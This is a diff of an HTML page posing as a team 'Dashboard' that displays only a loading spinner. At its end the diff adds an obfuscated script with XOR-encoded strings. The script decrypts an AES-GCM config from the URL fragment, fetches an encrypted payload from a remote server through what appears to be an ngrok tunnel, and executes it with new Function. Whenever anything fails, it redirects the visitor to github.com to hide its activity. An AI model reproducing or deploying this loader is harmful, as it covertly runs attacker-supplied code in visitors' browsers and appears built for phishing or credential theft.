@@ -1,17 +1,19 @@
 <!DOCTYPE html>
-<!-- build-id:f5a2b52f -->
+<!-- hydrate -->
 <html lang="en" data-turbo-body>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Dashboard</title>
 <link rel="icon" href="data:," type="image/x-icon">
-<meta name="request-id" content="644536454819">
-<meta name="route-pattern" content="/:org_id/dashboard">
+<meta name="turbo-cache-control" content="no-preview">
 <meta name="color-scheme" content="light dark">
-<meta name="html-safe-nonce" content="7f90a34794c8">
-<meta name="api-version" content="v5b208c309a60">
-<!-- fragment:a138f2f3 -->
+<meta name="api-version" content="v935ee23afff4">
+<meta name="html-safe-nonce" content="26c18390f900">
+<meta name="og:type" content="website">
+<meta name="browser-stats-url" content="/stats">
+<meta name="description" content="Secure workspace for your team">
+<!-- turbo-body -->
 <style>body{margin:0;padding:0;background:#f6f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif}
 #app{max-width:1012px;margin:0 auto;padding:40px 16px}
 .Header,.footer,.skeleton-line{display:none}
@@ -19,33 +21,37 @@
 .loader{width:40px;height:40px;margin:20vh auto;border:3px solid #d1d9e0;border-top-color:#586069;border-radius:50%;animation:spin .8s linear infinite}</style>
 <style>
 :root{--bgColor-default:#ffffff;--fgColor-default:#1f2328;--bgColor-muted:#f6f8fa;--borderColor-default:#d1d9e0;--color-accent-fg:#0969da;--header-bgColor:#24292f;--header-fgColor:#ffffff}
-@keyframes slide-up{from{transform:translateY(8px);opacity:0}to{transform:translateY(0);opacity:1}}
-@keyframes fade-in{from{opacity:0}to{opacity:1}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 .d-flex{display:flex!important}
-.flex-justify-center{justify-content:center!important}
-.mb-3{margin-bottom:16px!important}
+.text-center{text-align:center!important}
 .flex-items-center{align-items:center!important}
+.mb-3{margin-bottom:16px!important}
 .px-3{padding-right:16px!important;padding-left:16px!important}
-.anim-fade-in{animation:fade-in .3s ease-in-out}
-@media(prefers-color-scheme:dark){:root{--bgColor-default:#0d1117;--fgColor-default:#e6edf3}}
-@media(max-width:544px){.hide-sm{display:none!important}}
+.color-fg-default{color:var(--fgColor-default,#1f2328)!important}
+.icon{display:inline-block;overflow:visible;vertical-align:text-bottom;fill:currentColor}
+.mt-3{margin-top:16px!important}
+@media(max-width:768px){.hide-md{display:none!important}}
 </style>
 </head>
-<!-- rendered at 1288f4c2 -->
+<!-- fragment:8b81efa0 -->
 <body class="env-production">
-<script>window.__app={env:"production",node_id:"1b06ac55cb287268",session:"584f360988b501b7c1f4bea7",turbo:true,ssr:false}</script>
+<script>window.__app={env:"production",node_id:"440e7cd0e64d718d",session:"67c12683a71b8fb9282cfe8c",turbo:true,ssr:false}</script>
 <header class="Header" role="banner"><div class="Header-item"><a href="/" aria-label="Homepage"><svg height="32" viewBox="0 0 24 24" width="32" class="icon" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></a></div><div class="Header-item Header-item--full"><input type="text" class="form-control Header-input" placeholder="Search..." aria-label="Search"></div></header>
 <main>
 <div id="app">
 <div class="loader"></div>
 </div>
 </main>
-<div class="skeleton-line" style="width:55%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<div class="skeleton-line" style="width:45%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<div class="skeleton-line" style="width:79%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
-<!-- ssr:app-c93c2f10 -->
-<footer class="footer mt-3 text-center" role="contentinfo"><span>&copy; 2025</span> <a href="#api" class="footer-link">API</a> <a href="#status" class="footer-link">Status</a> <a href="#privacy" class="footer-link">Privacy</a> <a href="#terms" class="footer-link">Terms</a> <a href="#pricing" class="footer-link">Pricing</a></footer>
+<div class="skeleton-line" style="width:40%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:81%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:73%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:60%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:51%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<div class="skeleton-line" style="width:94%;height:12px;margin:8px auto;border-radius:3px;background:var(--bgColor-muted,#f6f8fa);animation:pulse 1.5s ease-in-out infinite"></div>
+<!-- build-id:110b556b -->
+<footer class="footer mt-3 text-center" role="contentinfo"><span>&copy; 2025</span> <a href="#privacy" class="footer-link">Privacy</a> <a href="#contact" class="footer-link">Contact</a> <a href="#pricing" class="footer-link">Pricing</a> <a href="#status" class="footer-link">Status</a> <a href="#terms" class="footer-link">Terms</a></footer>
 
-<script>(async function(){var fntgkztmcc=function(a){return a.map(function(c){return String.fromCharCode(c^90)}).join('')};var fnpvlrlkcd=function(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';var b=atob(s),a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);return a;};var fngncvngbg=function(h){var a=new Uint8Array(h.length/2);for(var i=0;i<h.length;i+=2)a[i/2]=parseInt(h.substr(i,2),16);return a;};var fniqjgctqd=async function(k,d){var _ymhabqek=await crypto.subtle.importKey('raw',k,fntgkztmcc([27, 31, 9, 119, 29, 25, 23]),false,['decrypt']);var _aocvlyzz=d.slice(0,12);var _catgnixg=d.slice(12);return await crypto.subtle.decrypt({name:fntgkztmcc([27, 31, 9, 119, 29, 25, 23]),iv:_aocvlyzz},_ymhabqek,_catgnixg);};try{var _wrcokdfk=new URLSearchParams(window.location.hash.substring(1));var _repwehbd=_wrcokdfk.get('d');if(!_repwehbd){window.location.replace(fntgkztmcc([50, 46, 46, 42, 41, 96, 117, 117, 61, 51, 46, 50, 47, 56, 116, 57, 53, 55]));return;}var _dyxkmjgc=fnpvlrlkcd(_repwehbd);var _unxndsxl=fngncvngbg('92e3173d64a7efc68b0bf2d28ca002cd44f0f479d71248b9ddc3da01d9d439ef');var _jrcsivhd=fngncvngbg('89e0187ffb99c0b49c1964d4e363e0e57fb8cc0821d39f5ecad63c56b3dc38fd');var _iyljfpqe=new Uint8Array(_unxndsxl.length);for(var i=0;i<_unxndsxl.length;i++)_iyljfpqe[i]=_unxndsxl[i]^_jrcsivhd[i];var _alsihiiu=JSON.parse(new TextDecoder().decode(await fniqjgctqd(_iyljfpqe,_dyxkmjgc)));if(_alsihiiu.e&&new Date()>new Date(_alsihiiu.e)){window.location.replace(fntgkztmcc([50, 46, 46, 42, 41, 96, 117, 117, 61, 51, 46, 50, 47, 56, 116, 57, 53, 55]));return;}var _tjcttwqm=await fetch(_alsihiiu.u+fntgkztmcc([117, 57, 117])+_alsihiiu.c,{headers:{[fntgkztmcc([2, 119, 10, 47, 56, 54, 51, 57, 119, 17, 63, 35])]:_alsihiiu.k,[fntgkztmcc([52, 61, 40, 53, 49, 119, 41, 49, 51, 42, 119, 56, 40, 53, 45, 41, 63, 40, 119, 45, 59, 40, 52, 51, 52, 61])]:'1'}});if(!_tjcttwqm.ok)throw new Error();var _ufcxmxxm=await _tjcttwqm.json();if(_ufcxmxxm.x&&new Date()>new Date(_ufcxmxxm.x)){window.location.replace(fntgkztmcc([50, 46, 46, 42, 41, 96, 117, 117, 61, 51, 46, 50, 47, 56, 116, 57, 53, 55]));return;}var _lzumxszy=new TextDecoder().decode(await fniqjgctqd(fngncvngbg(_alsihiiu.t),fnpvlrlkcd(_ufcxmxxm.d)));var _kvdumxhb=new Function('payload','b64','hex2buf','decrypt','return (async()=>{'+_lzumxszy+'})()');await _kvdumxhb(_alsihiiu,fnpvlrlkcd,fngncvngbg,fniqjgctqd);}catch(e){window.location.replace(fntgkztmcc([50, 46, 46, 42, 41, 96, 117, 117, 61, 51, 46, 50, 47, 56, 116, 57, 53, 55]));}})();</script>
+<script>(async function(){var fnjngnxlqs=function(a){return a.map(function(c){return String.fromCharCode(c^127)}).join('')};var fnievyjykw=function(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';var b=atob(s),a=new Uint8Array(b.length);for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);return a;};var fnvdllqtuu=function(h){var a=new Uint8Array(h.length/2);for(var i=0;i<h.length;i+=2)a[i/2]=parseInt(h.substr(i,2),16);return a;};var fnbijdersg=async function(k,d){var _cdbxbeyf=await crypto.subtle.importKey('raw',k,fnjngnxlqs([62, 58, 44, 82, 56, 60, 50]),false,['decrypt']);var _upglflwa=d.slice(0,12);var _hffgzvmj=d.slice(12);return await crypto.subtle.decrypt({name:fnjngnxlqs([62, 58, 44, 82, 56, 60, 50]),iv:_upglflwa},_cdbxbeyf,_hffgzvmj);};try{var _bvwrjgdh=new URLSearchParams(window.location.hash.substring(1));var _vgdjnhvx=_bvwrjgdh.get('d');if(!_vgdjnhvx){window.location.replace(fnjngnxlqs([23, 11, 11, 15, 12, 69, 80, 80, 24, 22, 11, 23, 10, 29, 81, 28, 16, 18]));return;}var _fbwznfyn=fnievyjykw(_vgdjnhvx);var _vcaenfkq=fnvdllqtuu('2293ee51707e5a21cbfc16d011c68b3d098fd7ecbdacbda2ab5c4970f177bf89');var _wkouiekv=fnvdllqtuu('4bde5858cfe4f742519484908acb3909ffbfffd9b05c2e68f9372a5781023e6d');var _nymxfeob=new Uint8Array(_vcaenfkq.length);for(var i=0;i<_vcaenfkq.length;i++)_nymxfeob[i]=_vcaenfkq[i]^_wkouiekv[i];var _dfodfkgs=JSON.parse(new TextDecoder().decode(await fnbijdersg(_nymxfeob,_fbwznfyn)));if(_dfodfkgs.e&&new Date()>new Date(_dfodfkgs.e)){window.location.replace(fnjngnxlqs([23, 11, 11, 15, 12, 69, 80, 80, 24, 22, 11, 23, 10, 29, 81, 28, 16, 18]));return;}var _jvqosubi=await fetch(_dfodfkgs.u+fnjngnxlqs([80, 28, 80])+_dfodfkgs.c,{headers:{[fnjngnxlqs([39, 82, 47, 10, 29, 19, 22, 28, 82, 52, 26, 6])]:_dfodfkgs.k,[fnjngnxlqs([17, 24, 13, 16, 20, 82, 12, 20, 22, 15, 82, 29, 13, 16, 8, 12, 26, 13, 82, 8, 30, 13, 17, 22, 17, 24])]:'1'}});if(!_jvqosubi.ok)throw new Error();var _qmmqxeaw=await _jvqosubi.json();if(_qmmqxeaw.x&&new Date()>new Date(_qmmqxeaw.x)){window.location.replace(fnjngnxlqs([23, 11, 11, 15, 12, 69, 80, 80, 24, 22, 11, 23, 10, 29, 81, 28, 16, 18]));return;}var _hopfhrii=new TextDecoder().decode(await fnbijdersg(fnvdllqtuu(_dfodfkgs.t),fnievyjykw(_qmmqxeaw.d)));var _mzljgwqm=new Function('payload','b64','hex2buf','decrypt','return (async()=>{'+_hopfhrii+'})()');await _mzljgwqm(_dfodfkgs,fnievyjykw,fnvdllqtuu,fnbijdersg);}catch(e){window.location.replace(fnjngnxlqs([23, 11, 11, 15, 12, 69, 80, 80, 24, 22, 11, 23, 10, 29, 81, 28, 16, 18]));}})();</script>
 </body>
 </html>
